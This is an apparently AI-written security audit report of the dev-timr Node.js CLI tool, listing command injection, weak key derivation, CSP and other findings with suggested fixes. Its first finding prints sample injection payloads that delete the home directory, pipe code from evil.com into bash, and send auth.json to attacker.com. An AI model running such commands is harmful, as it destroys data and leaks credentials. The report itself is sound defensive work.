# Security Assessment: dev-timr CLI Tool

**Assessment Date:** January 2026
**Tool Version:** 2.0.0
**Assessed By:** Claude Code Security Review

---

## Critical Issues (Must Fix Before Publishing)

### 1. Shell Command Injection

**Location:** `lib/tracker.js:161`

```javascript
spawn(commandString, [], { stdio: 'inherit', shell: true })
```

**Risk Level:** CRITICAL

**Description:** The `shell: true` option allows shell interpretation of the command string. Since CLI arguments are passed directly without sanitization, an attacker can inject arbitrary shell commands.

**Attack Examples:**
```bash
dev-timr "; rm -rf ~/"
dev-timr "$(curl evil.com/malware | bash)"
dev-timr "npm test && curl attacker.com/exfil?data=$(cat ~/.dev-timr/auth.json)"
```

**Impact:** Complete system compromise with user privileges. Attackers can:
- Delete files
- Install malware
- Exfiltrate sensitive data
- Establish persistent access

**Recommended Fix:**

Option 1 - Disable shell mode (recommended):
```javascript
import { parse } from 'shell-quote';

export function spawnChild(commandString) {
  const args = parse(commandString);
  const cmd = args.shift();
  const child = spawn(cmd, args, { stdio: 'inherit', shell: false });
  return child;
}
```

Option 2 - Use shell-escape library:
```javascript
import { quote } from 'shell-quote';
// Escape the command before passing to shell
```

---

### 2. No Input Sanitization on User Arguments

**Location:** `bin/index.js:162`

**Risk Level:** CRITICAL

**Description:** `process.argv` is passed directly to `spawnChild()` without any validation or sanitization, enabling the shell injection attack described above.

**Recommended Fix:**
- Validate command arguments against an allowlist of safe characters
- Reject or escape shell metacharacters (`;`, `|`, `&`, `$`, `` ` ``, etc.)
- Consider using a command parsing library

---

## High-Risk Issues

### 3. Weak Encryption Key Derivation

**Location:** `lib/secure-storage.js:34-40`

**Risk Level:** HIGH

**Description:** The encryption key for `auth.json` is derived from:
- `process.env.USER` or `process.env.USERNAME`
- `os.hostname()`
- Static string `'dev-timr-secret-v1'`

These values are often publicly known or easily discoverable, making brute-force attacks feasible.

**Impact:** If an attacker obtains the encrypted `auth.json` file and knows the username/hostname, they can decrypt the GitHub token and Supabase JWT.

**Recommended Fix:**
- Use OS keychain integration (e.g., `keytar` package)
- Add hardware identifiers or additional entropy sources
- Prompt user for a master password on first login
- Use a proper key derivation function with high iteration count

---

### 4. No Server-Side Session Revocation on Logout

**Location:** `lib/auth.js:407-441`

**Risk Level:** HIGH

**Description:** The logout function only clears local storage. It does not invalidate the JWT token on the server side. A stolen token remains valid until its natural expiration (7 days).

**Impact:** An attacker who obtains a user's token can continue accessing their data even after the user logs out.

**Recommended Fix:**
```javascript
async function logout() {
  const authData = readSecureAuthData();
  if (authData?.supabase?.accessToken) {
    // Call server to invalidate token
    await fetch(`${config.supabaseUrl}/functions/v1/logout`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${authData.supabase.accessToken}`,
      },
    });
  }
  clearSecureAuthData();
}
```

---

### 5. GitHub Token Held in Memory

**Location:** `lib/auth.js` (entire auth flow)

**Risk Level:** HIGH

**Description:** During the OAuth flow and subsequent operations, the GitHub access token is held in memory. If the process crashes and creates a core dump, or if an attacker can read process memory, the token could be exposed.

**Impact:** GitHub account compromise, unauthorized access to user's repositories and profile.

**Recommended Fix:**
- Clear sensitive variables after use
- Avoid storing tokens in global variables
- Consider using short-lived tokens where possible

---

## Medium-Risk Issues

### 6. Unencrypted Queue Storage

**Location:** `lib/queue.js`

**File:** `~/.dev-timr/queue.json`

**Risk Level:** MEDIUM

**Description:** The offline sync queue stores session data in plaintext, including:
- Session timestamps
- Task names
- Repository information
- Client IDs

**Impact:** Local attackers can read user activity history without needing to decrypt auth.json.

**Recommended Fix:** Encrypt `queue.json` using the same encryption mechanism as `auth.json`.

---

### 7. Permissive Content Security Policy

**Location:** `lib/server.js:36-43`

**Risk Level:** MEDIUM

**Description:** The CSP header includes:
- `'unsafe-inline'` for scripts and styles
- Allows external image sources (`https:`, `http:`)
- Allows external scripts from `cdn.jsdelivr.net`

**Impact:** Weakened XSS protection. If an attacker can inject content, inline scripts could execute.

**Recommended Fix:**
- Remove `'unsafe-inline'` where possible
- Use nonces or hashes for inline scripts
- Restrict image sources to specific domains

---

### 8. No Rate Limiting on Local Server

**Location:** `lib/server.js`

**Risk Level:** MEDIUM

**Description:** The Express GUI server has no rate limiting middleware. While it only binds to localhost, a malicious local process could abuse the API endpoints.

**Recommended Fix:**
```javascript
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // limit each IP to 100 requests per minute
});

app.use(limiter);
```

---

### 9. Caret Versioning in Dependencies

**Location:** `package.json:27-38`

**Risk Level:** MEDIUM

**Description:** All dependencies use `^` versioning, which allows automatic minor and patch updates. A compromised dependency update could affect all users.

**Recommended Fix:**
- Use exact versions for security-sensitive dependencies
- Commit `package-lock.json` to version control
- Regularly audit dependencies with `npm audit`
- Consider using `npm ci` in CI/CD pipelines

---

### 10. Plaintext Configuration File

**Location:** `lib/config.js`

**File:** `~/.dev-timr/config.json`

**Risk Level:** MEDIUM

**Description:** For self-hosted deployments, the Supabase anon key is stored in plaintext in the config file.

**Recommended Fix:**
- Encrypt the config file
- Or load sensitive values only from environment variables

---

## Low-Risk Issues

### 11. No Secrets Rotation Policy

**Risk Level:** LOW

**Description:** There is no documented procedure for rotating the GitHub Client ID or Supabase anon key for self-hosted deployments.

**Recommended Fix:** Document rotation procedures in the security documentation.

---

### 12. Silent Error Handling

**Risk Level:** LOW

**Description:** Multiple locations catch errors and silently continue, which could hide security issues during operation.

**Recommended Fix:** Log errors appropriately (without exposing sensitive data) for debugging.

---

### 13. Incomplete Input Validation

**Risk Level:** LOW

**Description:** Task names and other user inputs accept any string, including special characters. While not directly exploitable, this could lead to display issues or log injection.

**Recommended Fix:** Validate and sanitize user-provided strings.

---

## Positive Security Practices ✓

The following security measures are already implemented:

- ✅ AES-256-GCM encryption for auth tokens
- ✅ File permissions 0o600 on sensitive files
- ✅ HTTPS for all external API calls
- ✅ GitHub Device Flow OAuth (no password exposure)
- ✅ Security headers (X-Frame-Options, X-Content-Type-Options, X-XSS-Protection)
- ✅ Row-Level Security (RLS) architecture with Supabase
- ✅ Idempotency keys (client_id) for session deduplication
- ✅ Query parameter validation with defaults and max caps
- ✅ Auto-adding `.dev-clock.json` to `.gitignore`
- ✅ No secrets logged to console
- ✅ Parameterized database queries via Supabase client

---

## Summary Table

| # | Issue | Severity | Location | Status |
|---|-------|----------|----------|--------|
| 1 | Shell Command Injection | CRITICAL | `lib/tracker.js:161` | ✅ Fixed |
| 2 | No Input Sanitization | CRITICAL | `bin/index.js:162` | ✅ Fixed |
| 3 | Weak Key Derivation | HIGH | `lib/secure-storage.js:34-40` | ✅ Fixed |
| 4 | No Session Revocation | HIGH | `lib/auth.js:407-441` | ✅ Already implemented |
| 5 | Token in Memory | HIGH | `lib/auth.js` | ✅ Fixed |
| 6 | Unencrypted Queue | MEDIUM | `lib/queue.js` | ✅ Fixed |
| 7 | Permissive CSP | MEDIUM | `lib/server.js:36-43` | ✅ Fixed |
| 8 | No Rate Limiting | MEDIUM | `lib/server.js` | ✅ Fixed |
| 9 | Caret Versioning | MEDIUM | `package.json` | ✅ Fixed |
| 10 | Plaintext Config | MEDIUM | `lib/config.js` | ✅ Fixed |
| 11 | No Rotation Policy | LOW | Documentation | ✅ Fixed |
| 12 | Silent Errors | LOW | Various | ✅ Fixed |
| 13 | Input Validation | LOW | Various | ✅ Fixed |

---

## Recommendations Before npm Publish

### Must Fix (Blocking)
1. Fix shell command injection vulnerability
2. Add input sanitization for CLI arguments

### Should Fix (High Priority)
3. Improve encryption key derivation
4. Implement server-side session revocation

### Consider Fixing (Medium Priority)
5. Encrypt queue storage
6. Tighten CSP policy
7. Lock dependency versions

---

## References

- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- Node.js Security Best Practices: https://nodejs.org/en/docs/guides/security/
- npm Security: https://docs.npmjs.com/packages-and-modules/securing-your-code
